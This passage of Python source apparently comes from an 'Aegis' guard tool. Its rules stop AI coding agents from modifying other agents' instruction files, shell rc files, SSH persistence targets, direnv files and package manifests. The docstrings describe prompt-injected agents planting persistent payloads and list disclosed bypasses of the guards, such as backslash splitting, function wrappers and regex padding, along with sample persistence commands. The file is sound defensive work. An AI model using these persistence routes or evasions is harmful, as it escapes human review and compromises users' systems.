        # AGENT_DEF_DIR_RE catches a bare directory reference (no filename
        # ever named) and ARCHIVE_SYNC_VERB_RE catches the archive/sync verb
        # shape (rsync/tar/unzip/install -m) that places a file without
        # tripping any of the five verb checks below — QA finding
        # (independent adversarial review, round 1): both were missing
        # entirely from the first draft.
        names_target = bool(patterns.AGENT_INSTRUCTIONS_PATH_RE.search(cmd)
                             or patterns.AGENT_DEF_PATH_RE.search(cmd)
                             or patterns.AGENT_DEF_DIR_RE.search(cmd)
                             or patterns.agent_def_find_hit(cmd))
        touches_target = names_target and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        if not touches_target:
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_AGENT_DEF")
                or _agent_def_allowed_by_policy(cfg, _cmd(ev))):
            return None
        would = Decision(action, "agent-def-protect",
                         "Project instructions or an agent/command/output-style "
                         "definition is being modified from a shell — its content is "
                         "auto-loaded or auto-invoked in a future session with no "
                         "further review. A human may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_AGENT_DEF=1; a spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "agent-def-protect-monitor")
            return None
        return would
    return None


# ---- cross-tool agent-instructions protection: escapable with human confirm ----
def _cross_agent_instructions_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_cross_agent_instructions_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering another AI coding agent's own auto-loaded
    instructions file: Cursor's ``.cursorrules``/``.cursor/rules/*.mdc``,
    Windsurf's ``.windsurfrules``/``.windsurf/rules/*.md``, GitHub Copilot's
    ``.github/copilot-instructions.md``/``.github/instructions/*.instructions.md``,
    Cline's ``.clinerules`` (file or directory of ``.md`` files), Amazon Q
    Developer's ``.amazonq/rules/*.md``, and Gemini CLI's ``GEMINI.md``.

    THREAT MODEL: the identical shape ``rule_agent_def_protect``'s own
    ``AGENT_INSTRUCTIONS_PATH_RE`` half (CLAUDE.md/AGENTS.md) exists for —
    each of these files is folded directly into ITS OWN runtime's context on
    every future session, unattended, no opt-in, no "install a hook" step a
    human reviewing a diff would flag as unusual. What differs is the
    attacker's vantage point: a session running under Aegis today has no
    reason to maliciously READ its own CLAUDE.md/AGENTS.md, since
    ``rule_agent_def_protect`` already guards writes to it — but nothing
    stopped that SAME session (hijacked, prompt-injected, or just following
    a poisoned instruction it already trusted) from planting a payload in
    one of these OTHER tools' instruction files instead, files a teammate,
    or this same repo opened in Cursor/Windsurf/VS Code+Copilot/Cline/
    Amazon Q/Gemini CLI later, will silently trust with zero further
    review. A team standardizing on Claude Code today routinely has these
    other tools' config sitting right next to ``CLAUDE.md`` in the same
    repo (onboarding docs, a teammate's own editor preference) — until this
    guard existed, every one of them was a completely open, zero-detection
    cross-tool persistence surface, and the write doesn't even need to be
    read back by an AGENT to matter: a human opening the repo in the other
    tool is the trigger.

    Config (``policy.cross_agent_instructions``): ``mode`` (deny|ask|
    monitor|off, default ask), ``allow`` (regexes on the path/command that
    skip the gate — a repo's own CI-authored sync of these files, say).
    Defaults to ``ask`` for the same reason ``rule_agent_def_protect`` does:
    editing a ``.cursorrules``/``copilot-instructions.md`` is routine,
    sanctioned dev work for a team that actually uses that tool.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_CROSS_AGENT_INSTRUCTIONS=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a path-string match, not content-aware, same as
    ``rule_agent_def_protect``; a curated, not exhaustive, list of the
    current market's dominant tools — an instructions filename outside the
    six covered here (Roo Code's ``.roorules``, Aider's own conventions
    file, ...) is not covered, the same "curated, not exhaustive" trade-off
    ``rule_path_hijack_protect``'s own command-name list and
    ``CI_WORKFLOW_PATH_RE``'s own CI-provider list already make; a direct
    fetch-to-file write (``curl -o .cursorrules ...``) is caught by none of
    this guard's own write-verb checks — closed the same way every sibling
    guard's identical gap is, by ``rule_fetch_to_file_protect`` reusing this
    guard's own path regex (see ``_FETCH_HUMAN_ESCAPABLE``); an MCP tool
    naming its target argument outside ``_path()``'s recognized key list is
    missed the same way it is for every other ``_path()``-based guard in
    this file; and a shell command that computes the target path indirectly
    across separate variable assignments (a ``for``/``xargs`` loop,
    ``basename``/``dirname`` reconstruction) is not covered — ``find``'s
    ``-path``/``-name``/``-regex`` indirection IS covered, the same
    disclosed gap ``rule_self_protect``/``rule_ci_workflow_protect``/
    ``rule_agent_def_protect`` already carry for their own targets. The
    nested-file forms (``.cursor/rules/*.mdc``, ``.windsurf/rules/*.md``,
    ``.github/instructions/*.instructions.md``, ``.clinerules/*.md``,
    ``.amazonq/rules/*.md``) require their real extension the same way
    ``AGENT_DEF_PATH_RE`` requires ``.md`` for ``.claude/agents/*`` — Cline
    in practice reads any file under ``.clinerules/`` regardless of
    extension, so a non-``.md`` file dropped there evades the nested-file
    check specifically (the bare-directory fallback below still catches an
    archive/sync tool's own directory target regardless of the file's
    extension); nesting past 4 levels under any of the directory forms
    evades the filename check the same disclosed way it does for
    ``AGENT_DEF_PATH_RE`` (the bare-directory fallback again covers an
    archive/sync tool's own target regardless of nesting)."""
    cfg = getattr(policy, "cross_agent_instructions", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        if not (p and patterns.CROSS_AGENT_INSTRUCTIONS_PATH_RE.search(p)):
            return None
        if (os.environ.get("AEGIS_ALLOW_CROSS_AGENT_INSTRUCTIONS")
                or _cross_agent_instructions_allowed_by_policy(cfg, p)):
            return None
        would = Decision(action, "cross-agent-instructions-protect",
                         f"Another AI coding agent's instructions file '{p}' is being "
                         "written — its content is folded directly into that tool's own "
                         "context on every future session, unattended. Review the "
                         "change, then confirm with "
                         "AEGIS_ALLOW_CROSS_AGENT_INSTRUCTIONS=1; a spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "cross-agent-instructions-protect-monitor")
            return None
        return would

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_target = bool(patterns.CROSS_AGENT_INSTRUCTIONS_PATH_RE.search(cmd)
                             or patterns.CROSS_AGENT_INSTRUCTIONS_DIR_RE.search(cmd)
                             or patterns.cross_agent_instructions_find_hit(cmd))
        touches_target = names_target and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        if not touches_target:
            return None
        if (_override_allowed(ev)
                or os.environ.get("AEGIS_ALLOW_CROSS_AGENT_INSTRUCTIONS")
                or _cross_agent_instructions_allowed_by_policy(cfg, _cmd(ev))):
            return None
        would = Decision(action, "cross-agent-instructions-protect",
                         "Another AI coding agent's instructions file is being "
                         "modified from a shell — its content is auto-loaded by that "
                         "tool in a future session with no further review. A human "
                         "may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_CROSS_AGENT_INSTRUCTIONS=1; a spawned agent "
                         "cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "cross-agent-instructions-protect-monitor")
            return None
        return would
    return None


# ---- shell-startup / SSH persistence protection: escapable with human confirm --
def _shell_persist_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_shell_persist_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a shell startup/profile file (``~/.bashrc``,
    ``~/.zshrc``, ``~/.profile``, ``~/.bash_aliases``, ``~/.xprofile``, fish's
    ``config.fish``, ``/etc/profile.d/*.sh``, a PowerShell ``$PROFILE``, ...)
    or an SSH persistence target (``~/.ssh/authorized_keys``, ``~/.ssh/rc``,
    ``~/.ssh/environment``, ``~/.ssh/config``, ``/etc/ssh/sshd_config``,
    ``/etc/ssh/ssh_config``, and their ``Include``d drop-in directories
    ``/etc/ssh/sshd_config.d/*.conf``/``/etc/ssh/ssh_config.d/*.conf``).

    The shell-startup half is reached by no existing guard at all:
    ``rule_mcp_config_protect``/``rule_ci_workflow_protect``/
    ``rule_git_hooks_protect``/``rule_agent_def_protect`` all fire on a session
    start, a CI run, or a git operation — none of them fire on the single most
    common human action there is, opening a new terminal. A shell startup file
    executes arbitrary code, with the human's full privileges, every time they
    open an interactive shell from now on — unlike ``CLAUDE.md`` this isn't
    even specific to an agentic coding session.

    NOT new coverage for most of the SSH half: ``rule_containment``'s
    ``CRED_RE`` already denies, non-escapably, ANY shell/Edit/Write/MCP action
    whose text contains a `.ssh` path segment preceded by a `/`/`\\` — which
    matches ``~/.ssh/authorized_keys``/``~/.ssh/config`` in their ordinary,
    absolute-or-home-relative forms and wins first (containment runs earlier
    in ``BUILTIN_RULES`` and evaluate() is first-deny-wins), so this guard's
    own (weaker, escapable) decision for those two paths never actually
    surfaces in that common case. What IS new: (1) ``/etc/ssh/sshd_config``/
    ``/etc/ssh/ssh_config`` — no dot before "ssh" in that path, so
    ``CRED_RE``'s ``\\.ssh`` alternative never matches it at all; (2) a
    relative reference with NO leading path separator (e.g. the literal
    string ``.ssh/authorized_keys`` as its own shell token, as in
    ``echo x >> .ssh/authorized_keys`` run from ``$HOME``) — ``CRED_RE``
    requires a `/`/`\\` immediately before the dot, but this guard's patterns
    accept whitespace/quote/start-of-string too, so they still catch it where
    containment does not. An appended ``authorized_keys`` entry grants durable
    remote login with no password/agent involvement at all; ``~/.ssh/rc`` runs
    arbitrary shell on every accepted login when sshd's ``PermitUserRC`` is on
    (the common default); a ``ProxyCommand``/``LocalCommand``/
    ``PermitLocalCommand``/``PermitRootLogin`` directive in an SSH config or
    one of its drop-ins runs arbitrary code or grants access on the next
    matching connection — the client/server-side equivalent of a git hook, on
    a different trigger entirely — which is why this guard still declares the
    surface even though containment pre-empts most of the ordinary-path
    traffic through it.

    QA history (independent adversarial review, two parallel rounds): the
    original draft covered only the single top-level ``sshd_config``/
    ``ssh_config`` file, missing the ``Include``d drop-in directories
    (``/etc/ssh/sshd_config.d/*.conf``/``/etc/ssh/ssh_config.d/*.conf``) a
    stock Debian/Ubuntu/RHEL install already assembles its config from —
    fixed by adding both the filename form and a ``SHELL_PERSIST_DIR_RE``
    bare-directory entry for archive/sync-tool coverage. It also missed
    ``~/.ssh/rc``/``~/.ssh/environment`` entirely, the macOS/upstream-zsh
    system file layout (bare ``/etc/zshenv``/``/etc/zprofile``/etc., as
    opposed to the Debian ``/etc/zsh/zshrc`` layout — zsh is the default
    shell on every Mac since Catalina), ``~/.bash_aliases`` (sourced
    unconditionally by a stock Debian/Ubuntu ``.bashrc``, same blast radius as
    editing ``.bashrc`` itself), ``~/.xprofile`` (sourced by lightdm/gdm/sddm
    at the next graphical login), and the PowerShell ISE profile variant —
    all now covered.

    Config (``policy.shell_persist``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate — a repo's
    own trusted dotfile-manager sync, say). Defaults to ``ask`` for the same
    reason ``rule_ci_workflow_protect``/``rule_git_hooks_protect``/
    ``rule_agent_def_protect`` do: editing a shell rc file (a PATH tweak, an
    alias) or an SSH config (adding a Host block) is routine, sanctioned dev
    work, unlike planting an MCP server.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form, or
    the env toggle ``AEGIS_ALLOW_SHELL_PERSIST=1`` set by the orchestrator/
    human before launch for the Edit/Write/MCP-tool form. A spawned agent
    cannot set its own env for a hook invocation it doesn't control, so
    neither path is agent-self-escapable.

    Honest scope: a path-string match, the same denylist trade-offs as every
    other guard in this file. ``SHELL_PERSIST_DIR_RE`` + ``ARCHIVE_SYNC_VERB_RE``
    (reused as-is from ``rule_agent_def_protect`` rather than re-copied — both
    are already generic, path-independent verb patterns with their own ReDoS
    coverage, so reusing them carries less risk than minting a third,
    less-battle-tested copy) close the archive/sync-tool bypass the same way
    they do there. ``SHELL_PERSIST_DIR_RE`` is checked only on the shell
    branch, never the Edit/Write/MCP one — deliberately, matching
    ``GIT_HOOKS_DIR_RE``/``AGENT_DEF_DIR_RE``'s identical precedent: an
    Edit/Write/MCP file-mutation tool always names a specific file, never a
    bare directory, so there is no equivalent of an archive/sync tool's
    directory-only target argument on that branch to catch.

    Known residual gaps, same spirit as every guard in this file: a direct
    fetch-to-file write (``curl -o ~/.ssh/authorized_keys ...``, ``wget -O
    ...``) with no verb any of the five write-verb checks recognizes — the
    same inherited gap ``rule_ci_workflow_protect``/``rule_git_hooks_protect``/
    ``rule_agent_def_protect`` already disclose, not new or worse here; the
    bare filename ``config`` under ``~/.ssh/`` and the bare words
    ``profile``/``profile.ps1``/``rc``/``environment`` are deliberately
    excluded from the ``find``-indirection fallback (too generic — see
    ``patterns.py``'s own note on this guard's patterns); a shell command that
    computes the target path indirectly across separate variable assignments
    (a `for`/`xargs` loop or `basename`/`dirname` reconstruction) is not
    covered, the same disclosed gap every other guard in this file carries;
    an MCP tool naming its target argument outside ``_path()``'s recognized
    key list is missed the same way it is for every other ``_path()``-based
    guard in this file (not unique or worse here — a shared limitation of the
    helper itself, out of this guard's scope to fix); an environment-variable
    override that RELOCATES where a shell looks for its startup file —
    fish's ``$XDG_CONFIG_HOME`` (defaults to ``~/.config``), zsh's
    ``$ZDOTDIR`` (defaults to ``$HOME``) — is not covered when set to a
    directory this guard's patterns don't otherwise recognize (QA finding,
    independent adversarial review, round 2): the actual target file is only
    knowable by resolving an environment variable's value, the same
    "computed indirectly, not a literal path" class of gap every guard in
    this file already accepts for shell-computed paths in general; and, like
    every other guard here, a write-verb only needs to appear ANYWHERE in the
    (de-obfuscated) command alongside the matched path, not adjacent to or
    provably operating on it — a read redirected elsewhere (``cat ~/.bashrc >
    /tmp/backup.txt``) can gate under ``ask`` the same way a real overwrite
    does; the cost is one unnecessary human confirmation, not a missed
    detection, the same accepted direction every sibling guard in this file
    takes.

    QA history (independent adversarial review, round 2 — verification pass
    on the round-1 fixes): confirmed all round-1 fixes correct and regression-
    free, then found a new, systemic bug: every ``/etc/*`` alternative in both
    ``SHELL_RC_PATH_RE`` and ``SSH_PERSIST_PATH_RE`` hardcoded a literal
    single ``/`` between "etc" and the next path component instead of
    ``_SEP`` — so ``/etc//ssh/sshd_config`` (byte-identical to the real path
    as far as the OS is concerned) sailed through every one of them
    undetected, the exact bug class this file's own ``_SEP``/``_WIN_TRIM``
    exist to close elsewhere (``AEGIS_SOURCE_RE``, ``CI_WORKFLOW_PATH_RE``).
    Fixed by routing every ``/etc/*`` alternative through ``_SEP`` instead of
    a literal slash, the same convention those patterns already use — see
    ``patterns.py``'s own comment on this fix for detail."""
    cfg = getattr(policy, "shell_persist", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        rc_hit = bool(p and patterns.SHELL_RC_PATH_RE.search(p))
        ssh_hit = bool(p and patterns.SSH_PERSIST_PATH_RE.search(p))
        if not (rc_hit or ssh_hit):
            return None
        if os.environ.get("AEGIS_ALLOW_SHELL_PERSIST") or _shell_persist_allowed_by_policy(cfg, p):
            return None
        reason = (f"Shell startup file '{p}' is being written — it runs "
                   "automatically, with the human's full privileges, the next "
                   "time they open an interactive shell" if rc_hit else
                   f"SSH persistence target '{p}' is being written — an added "
                   "key or ProxyCommand/LocalCommand directive grants durable "
                   "remote access or runs on the next matching ssh invocation")
        would = Decision(action, "shell-persist-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_SHELL_PERSIST=1; a spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "shell-persist-protect-monitor")
            return None
        return would

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_target = bool(patterns.SHELL_RC_PATH_RE.search(cmd)
                             or patterns.SSH_PERSIST_PATH_RE.search(cmd)
                             or patterns.SHELL_PERSIST_DIR_RE.search(cmd)
                             or patterns.shell_persist_find_hit(cmd))
        touches_target = names_target and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        if not touches_target:
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_SHELL_PERSIST")
                or _shell_persist_allowed_by_policy(cfg, _cmd(ev))):
            return None
        would = Decision(action, "shell-persist-protect",
                         "A shell startup file or SSH persistence target is "
                         "being modified from a shell — it runs automatically, "
                         "unattended, the next time the human opens a shell or "
                         "connects over SSH. A human may append "
                         "'# aegis-allow', or set AEGIS_ALLOW_SHELL_PERSIST=1; "
                         "a spawned agent cannot.")
        if mode == "monitor":
            _record_monitor(ev, would, "shell-persist-protect-monitor")
            return None
        return would
    return None


# ---- direnv .envrc / direnvrc auto-exec-on-cd protection: escapable with human confirm --
def _direnv_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_direnv_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a direnv-managed file (a project ``.envrc``;
    the GLOBAL ``direnvrc`` — ``~/.config/direnv/direnvrc`` / the legacy
    ``~/.direnvrc``; or ``direnv.toml``'s ``[whitelist]``, which pre-trusts
    matching ``.envrc`` paths unconditionally) and block the activation
    commands (``direnv allow``/``direnv permit``/``direnv edit``) that trust
    an untrusted/changed ``.envrc`` with no file write of their own.

    THREAT MODEL: reached by no existing guard at all — direnv (bundled or
    one ``apt``/``brew install`` away, routine in Python/Node/Go dev setups
    for per-project env vars and venv/nvm/asdf activation) auto-SOURCES a
    project's ``.envrc`` as arbitrary bash the next time ANYONE (this agent,
    a teammate, CI via ``direnv exec``) ``cd``s into that directory or a
    descendant of it — no git operation, CI run, or agent-session restart
    needed, the same "fires on the single most common action there is"
    shape ``rule_shell_persist_protect``'s own ``.bashrc`` half already
    covers, but for `cd` rather than opening a new shell, and direnv nests:
    a ``.envrc`` several directories below the project root still fires,
    sourced in addition to its parents'. The GLOBAL ``direnvrc`` is worse:
    it is sourced for EVERY ``.envrc`` on the whole machine, for every
    project, with NO per-file trust check at all — the direnv analog of
    ``~/.bashrc`` itself, but firing on every ``cd`` into ANY direnv-managed
    project rather than only on a new shell.

    What makes this surface distinct from ``rule_shell_persist_protect``'s:
    direnv ships its own defense — an untrusted or changed ``.envrc`` is
    blocked with a loud warning until a human runs ``direnv allow``. But
    that defense is a CLI subcommand an agent can invoke itself, not an OS
    dialog only a human can click — unlike VS Code's one-time "Allow
    Automatic Tasks" prompt, nothing stops a spawned agent from running
    ``direnv allow`` right after planting the payload and defeating direnv's
    own human-in-the-loop check in the same tool call. ``direnv edit`` is the
    same risk under a different name: it opens ``$EDITOR`` and then
    auto-allows on save, so a non-interactive ``$EDITOR`` (a script that
    just exits 0, say) makes it equivalent to an unconditional ``allow``.
    This is why the guard has a file-write half AND an activation-command
    half, the same three-way split ``rule_service_persist_protect`` uses for
    ``systemctl enable``/``launchctl load``.

    Config (``policy.direnv``): ``mode`` (deny|ask|monitor|off, default ask),
    ``allow`` (regexes on the path/command that skip the gate — a repo's own
    trusted ``.envrc`` bootstrap script, say). Defaults to ``ask`` for the
    same reason every sibling ``*_protect`` guard does: editing a project's
    ``.envrc`` to add a `PATH` tweak or a venv activation line is routine,
    sanctioned dev work, unlike planting an MCP server — it just needs a
    human to have actually looked at it before it runs unattended.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_DIRENV=1`` set by the orchestrator/human
    before launch for the Edit/Write/MCP-tool form. A spawned agent cannot
    set its own env for a hook invocation it doesn't control, so neither
    path is agent-self-escapable — the same invariant every escapable guard
    in this file holds. Note this means ``direnv allow``/``direnv permit``
    run BY A HUMAN, after they've reviewed the diff, is exactly the
    confirmation this guard exists to require — the guard does not fire
    twice; it just makes the review actually happen before the trust is
    granted instead of after.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a path assembled indirectly (shell variable concatenation
    across separate assignments, a ``for``/``xargs`` loop, ``basename``/
    ``dirname`` reconstruction) rather than appearing as one contiguous
    literal is not caught; a direct fetch-to-file write (``curl -o .envrc
    ...``, ``wget -O ~/.config/direnv/direnvrc ...``) is caught by none of
    the shell branch's five write-verb checks — the same inherited gap
    ``rule_ci_workflow_protect``/``rule_git_hooks_protect``/
    ``rule_agent_def_protect``/``rule_shell_persist_protect``/
    ``rule_service_persist_protect`` already disclose, not new or worse
    here; an ``$XDG_CONFIG_HOME`` relocation of where the global ``direnvrc``
    lives is not covered when set to a directory this guard's patterns don't
    otherwise recognize — the same "computed indirectly, not a literal path"
    class of gap ``rule_shell_persist_protect``'s own docstring already
    accepts for fish's ``$XDG_CONFIG_HOME``/zsh's ``$ZDOTDIR``; and, unlike
    ``rule_shell_persist_protect``/``rule_service_persist_protect``, this
    guard has no bare-directory ``find_hit``/``DIR_RE`` fallback for an
    archive/sync tool that restores a whole project directory containing an
    ``.envrc`` without ever naming it discretely — deliberately: unlike
    ``.ssh`` or a systemd unit dir, an ``.envrc``'s own parent directory IS
    the project root, too generic a bare-directory signal to gate on without
    flagging nearly every project checkout, the same "too generic" trade-off
    ``SHELL_PERSIST_FIND_RE`` already accepts for the bare words
    "config"/"profile".

    QA history (two independent adversarial reviews, run in parallel, same
    convention ``rule_service_persist_protect``/``rule_git_config_exec_protect``
    used): round A (bypass hunting) found the original draft's file-write
    half covered only the two exec-capable files (``.envrc``/``direnvrc``),
    missing ``direnv.toml``'s ``[whitelist]`` — not itself executable, but
    its ``prefix``/``exact`` entries pre-trust matching ``.envrc`` paths
    UNCONDITIONALLY (direnv's own docs: honored "regardless of contents or
    past usage of `direnv allow`/`direnv deny`"), a strictly MORE dangerous
    primitive than trusting one ``.envrc`` — every future ``.envrc`` under
    the whitelisted prefix auto-runs too, forever, with no further
    per-content check; fixed by adding it to ``DIRENV_PATH_RE`` and the
    ``find``-indirection fragment list (see ``patterns.py``'s own comment on
    this fix). Round A also surfaced three gaps confirmed to be pre-existing
    and SHARED across every literal-substring guard in this file, not new or
    unique to this one (verified against ``rule_service_persist_protect``
    with the equivalent input, same result both times) — disclosed here
    rather than fixed, since a real fix belongs in the shared
    ``normalize.scan_surface``/activation-regex layer every ``*_protect``
    guard builds on, not in one guard's patterns: (1) a bare backslash
    before an ordinary character is removed by bash at parse time (``di\\
    renv`` IS ``direnv``) but ``scan_surface`` only strips quote characters
    and ANSI-C (``$'...'``) escapes, never a bare mid-token backslash, so
    ``echo x >> .e\\nvrc``/``di\\renv allow`` both evade detection the same
    way ``echo x >> ~/.ba\\shrc`` already evades ``rule_shell_persist_protect``
    today; (2) a one-line shell function wrapper (``d() { direnv "$@"; }; d
    allow``) breaks ``DIRENV_ACTIVATE_RE``'s word-adjacency assumption while
    bash still executes the real command — the same gap
    ``SERVICE_ACTIVATE_CMD_RE`` already has for ``s() { systemctl "$@"; }; s
    enable evil.service``; (3) the 200-char non-greedy gap
    ``DIRENV_ACTIVATE_RE`` inherited from ``SERVICE_ACTIVATE_CMD_RE`` is a
    wider fixed bound, not a structural fix, so a single ~220-char padding
    argument still pushes the verb outside it, the exact bug class that
    guard's own docstring already discloses widening (not eliminating) at
    round A of its own QA. Round B (design/consistency) confirmed the
    guard's structure, escape hatches, and registration (``_CORE_RULES``,
    ``Policy``, ``loader.py``, ``skills.py``, README) all match sibling-guard
    convention with no gaps, verified the ``loader.py`` YAML knob wiring
    end-to-end (not just by reading), and confirmed no ReDoS risk on
    adversarial input for any of this guard's new patterns."""
    cfg = getattr(policy, "direnv", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "direnv-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        if not (p and patterns.DIRENV_PATH_RE.search(p)):
            return None
        if os.environ.get("AEGIS_ALLOW_DIRENV") or _direnv_allowed_by_policy(cfg, p):
            return None
        reason = (f"direnv-managed file '{p}' is being written — it runs as "
                   "arbitrary shell, automatically and unattended, the next "
                   "time anyone `cd`s into this project (or, for the global "
                   "direnvrc, into ANY direnv-managed project on this "
                   "machine)")
        return _finish(Decision(action, "direnv-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_DIRENV=1; a spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        names_target = bool(patterns.DIRENV_PATH_RE.search(cmd)
                             or patterns.direnv_find_hit(cmd))
        touches_target = names_target and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        activates = bool(patterns.DIRENV_ACTIVATE_RE.search(cmd))
        if not (touches_target or activates):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_DIRENV")
                or _direnv_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A direnv-managed file is being modified from a shell"
                   if touches_target else
                   "direnv is being told to trust/edit an .envrc, silencing "
                   "its own untrusted-content warning")
        return _finish(Decision(action, "direnv-protect",
                         f"{reason} — it runs automatically, unattended, the "
                         "next time anyone `cd`s into this (or any "
                         "direnv-managed) project. A human may append "
                         "'# aegis-allow', or set AEGIS_ALLOW_DIRENV=1; a "
                         "spawned agent cannot."))
    return None


# ---- package-manifest lifecycle-script / registry-hijack protection ----------
def _package_manifest_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_package_manifest_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting a lifecycle-script hook in a package manifest
    (``package.json``'s ``preinstall``/``install``/``postinstall``/
    ``preuninstall``/``postuninstall``/``prepare``/``prepublish``/
    ``prepublishOnly``, or ``composer.json``'s ``pre-install-cmd``/
    ``post-install-cmd``/``pre-update-cmd``/``post-update-cmd``/
    ``pre-autoload-dump``/``post-autoload-dump``/``pre-package-install``/
    ``post-package-install``/``pre-archive-cmd``/``post-archive-cmd``), or
    redirecting a package registry/index (``.npmrc``, ``.yarnrc``/
    ``.yarnrc.yml``, ``pip.conf``/``pip.ini``, ``.cargo/config.toml``,
    ``pyproject.toml``'s ``[[tool.poetry.source]]``).

    THREAT MODEL: ``rule_install_review`` forces a full read of a manifest
    before an install proceeds — it guards against installing a THIRD PARTY
    package that already carries a malicious lifecycle script. Nothing
    guarded the other direction: an agent (hijacked, prompt-injected, or
    just careless) EDITING a manifest to plant the script itself. A
    lifecycle hook runs with zero confirmation, zero explicit invocation by
    name, on the very next ``npm install``/``npm ci``/``composer install`` —
    by this same agent moments later, a teammate, or an unattended CI
    runner — and reads in a diff as a one-line, routine-looking addition to
    a ``scripts`` object, not as a backdoor. This is the exact mechanism
    behind real supply-chain compromises (eslint-scope, ua-parser-js,
    event-stream all shipped a malicious ``postinstall``). The registry half
    is the same "trusted name, poisoned source" shape ``ci_workflow``/
    ``git_hooks``/``agent_def``/``shell_persist`` all share: silently
    swapping WHERE every future, completely ordinary-looking
    ``npm install lodash`` fetches from.

    Distinct from every other ``*_protect`` guard in this file: those gate
    on PATH alone, because their target files (a CI workflow, a git hook, a
    shell rc file) are rarely touched for benign reasons. ``package.json``/
    ``composer.json``/``pyproject.toml`` are not — they're edited on nearly
    every commit to add a dependency or bump a version. Gating on path alone
    here would fire on almost every routine change and get this guard
    disabled from ask-fatigue, so both the manifest and registry checks also
    require the CONTENT of the edit to name one of a curated, narrow set of
    lifecycle-script/registry keys — names that essentially only ever appear
    in these files for the one reason this guard exists to catch. A benign
    edit adding a "test"/"build"/"start"/"lint" script (requires an explicit
    ``npm run <name>``, never auto-executed) never matches and stays
    allowed.

    Config (``policy.package_manifest``): ``mode`` (deny|ask|monitor|off,
    default ask), ``allow`` (regexes on the path/command that skip the gate
    — a repo's own trusted private-registry setup, say). Defaults to ``ask``
    for the same reason ``ci_workflow``/``git_hooks``/``agent_def``/
